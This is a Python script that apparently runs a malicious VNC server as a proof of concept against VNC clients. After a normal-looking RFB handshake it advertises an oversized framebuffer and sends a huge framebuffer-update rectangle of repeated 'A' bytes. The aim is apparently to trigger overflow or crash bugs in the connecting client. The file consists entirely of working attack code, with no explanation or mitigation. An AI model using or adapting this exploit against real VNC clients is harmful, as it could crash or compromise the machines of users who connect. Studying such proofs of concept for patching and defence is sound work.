import sys
import socket
import time

listen_port = int(sys.argv[1])

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', listen_port))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")

            # send protocol version
            conn.send(b'RFB 003.007\n')
            data = conn.recv(1024)
            print('Client protocol version:', data)

            # send security types
            conn.send(b'\x02\x01\x10')
            data = conn.recv(1)
            print('Client selected security type:', data)

            # client share desktop flag
            data = conn.recv(1)
            print('Client share desktop flag:', data)

            # send server framebuf params
            conn.send(b'\xff\xff\xff\xff \x18\x00\x01\x00\xff\x00\xff\x00\xff\x10\x08\x00\x00\x00\x00\x00\x00\x00\x03' + b'poc')

            # client pixel format, encodings, framebuf update req
            data = conn.recv(20)
            print('Client set pixel format:', data)
            data = conn.recv(80)
            print('Client set encodings:', data)

            data = conn.recv(10)
            print('Client framebuffer update request:', data)

            server_fbu = b'\x00' # message-type
            server_fbu += b'\x00' # padding
            server_fbu += b'\x00\x01' # number-of-rectangles
            server_fbu += b'\x00\x00\x00\x00\xf4\x3d\x43\x15\x00\x00\x00\x00' # rectangle heading
            server_fbu += b'A'*0xf43d*0x4315*4 # rectangle data
            conn.sendall(server_fbu)

            print('Client response:', conn.recv(1024))

            time.sleep(100)
finally:
    s.close()
